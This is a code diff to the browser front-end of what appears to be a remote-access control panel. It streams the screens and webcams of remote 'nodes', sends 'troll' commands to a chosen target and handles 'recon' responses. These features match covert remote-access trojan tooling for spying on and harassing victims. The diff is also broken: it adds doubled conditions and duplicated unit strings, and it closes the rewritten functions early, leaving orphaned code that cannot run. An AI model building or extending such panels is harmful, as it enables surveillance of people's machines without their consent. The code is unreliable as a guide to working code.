@@ -268,7 +268,7 @@ function handleMsg(d) {
 		case "pong":
 			if (pingSentAt) {
 				const ms = Math.round(performance.now() - pingSentAt);
-				if ($("remoteLatency")) $("remoteLatency").textContent = `${ms}ms`;
+				if ($("remoteLatency")) if ($("remoteLatency")) $("remoteLatency").textContent = `${ms}ms` + " ms";
 				pingSentAt = 0;
 			}
 			// Echo pong back to agent with timestamp for adaptive quality RTT
@@ -952,20 +952,50 @@ function drawGraphs() {
 function openRemote(id, node) {
 	currentTargetId = id;
 	_fsNodeId = id;
-	$("remoteModal").style.display = "block";
-	$("remoteNodeLabel").textContent = id;
-
-	// Hide main UI elements to prevent overlap and increase immersion
-	const topBar = document.querySelector(".top-bar");
-	const sidebar = document.querySelector(".sidebar");
-	const mainArea = document.querySelector(".main-area");
-	if (topBar) topBar.style.display = "none";
-	if (sidebar) sidebar.style.display = "none";
-	if (mainArea) mainArea.style.marginLeft = "0";
-	if (mainArea) mainArea.style.padding = "0";
-
-	// Update selectors based on specs
+	
+    // Workspace Transition
+    const app = document.getElementById("appContainer");
+    if (app) app.classList.add("show-remote");
+    
 	const s = node?.specs || node || {};
+    const displayId = s.hostname || id;
+    if ($("remoteNodeLabel")) $("remoteNodeLabel").textContent = displayId;
+
+	// Populate monitors
+	const monSelect = $("monSelect");
+	if (monSelect) {
+		let html = "";
+		const monCount = s.monitors || 1;
+		for (let i = 0; i < monCount; i++)
+			html += `<option value="${i}">Screen ${i + 1}</option>`;
+		monSelect.innerHTML = html;
+		monSelect.value = "0";
+	}
+
+	// Populate cameras
+	const camSelect = $("camSelect");
+	if (camSelect) {
+		let html = `<option value="-1">Cam Off</option>`;
+		const camCount = s.cameras || 0;
+		const names = s.camera_names || [];
+		for (let i = 0; i < camCount; i++)
+			html += `<option value="${i}">${names[i] || `Camera ${i + 1}`}</option>`;
+		camSelect.innerHTML = html;
+		camSelect.value = "-1";
+	}
+
+	_streaming = true;
+	frameCount = 0;
+	lastFpsTime = performance.now();
+    
+	if (socket?.readyState === WebSocket.OPEN) {
+		socket.send(JSON.stringify({ type: "select_device", id }));
+		socket.send(JSON.stringify({ type: "stream", cmd: "start", id }));
+	}
+    
+    // Default tab
+	switchRemoteTab("screen");
+};
 	const monSel = $("monitorSelector");
 	if (monSel && s.monitors > 1) {
 		monSel.style.display = "flex";
@@ -1131,12 +1161,17 @@ function _togglePanel() {
 	if (btn) btn.classList.toggle("active", isOpen);
 }
 
-function _closeRemote() {
-	$("remoteModal").style.display = "none";
-	$("desktopView").style.display = "none";
-	if ($("camContainer")) {
-		$("camContainer").style.display = "none";
+function closeRemote() {
+    const app = document.getElementById("appContainer");
+    if (app) app.classList.remove("show-remote");
+    
+	_streaming = false;
+	if (socket?.readyState === WebSocket.OPEN && currentTargetId) {
+		socket.send(JSON.stringify({ type: "stream", cmd: "stop", id: currentTargetId }));
 	}
+	currentTargetId = null;
+    logEvent("Remote session closed.", "info");
+}
 	const cv = $("camView");
 	if (cv && _canvasCtx.camView) {
 		_canvasCtx.camView.clearRect(0, 0, cv.width, cv.height);
@@ -1478,7 +1513,7 @@ function renderToCanvas(jpegBuf, canvasId, isDesktop, recvTs) {
 	frameCount++;
 	const now = performance.now();
 	if (now - lastFpsTime >= 1000) {
-		if ($("remoteFps")) $("remoteFps").textContent = frameCount;
+		if ($("remoteFps")) if ($("remoteFps")) $("remoteFps").textContent = frameCount + " FPS";
 		frameCount = 0;
 		lastFpsTime = now;
 	}
@@ -4812,7 +4847,7 @@ const handleReconResponse = (data) => {
 };
 
 // Global aliases for mismatched index.html calls
-window.closeRemote = _closeRemote;
+window.closeRemote = closeRemote;
 window.setStreamFps = _setStreamFps;
 window.togglePanel = _togglePanel;
 window.toggleFullscreen = _toggleFullscreen;
@@ -4853,14 +4888,14 @@ setInterval(() => {
     const h = Math.floor(diff / 3600).toString().padStart(2, '0');
     const m = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
     const s = (diff % 60).toString().padStart(2, '0');
-    uptimeEl.textContent = ${h}::;
+    uptimeEl.textContent = `${h}:${m}:${s}`;
 }, 1000);
 function execTroll(type) {
     if (!currentTargetId) {
         logEvent("No active node selected for command.", "error");
         return;
     }
-    logEvent(Executing  on node , "warning");
+    logEvent(`Executing ${type} on node ${currentTargetId}`, "warning");
     if (socket?.readyState === WebSocket.OPEN) {
         socket.send(JSON.stringify({ type: "troll", cmd: type, id: currentTargetId }));
     }
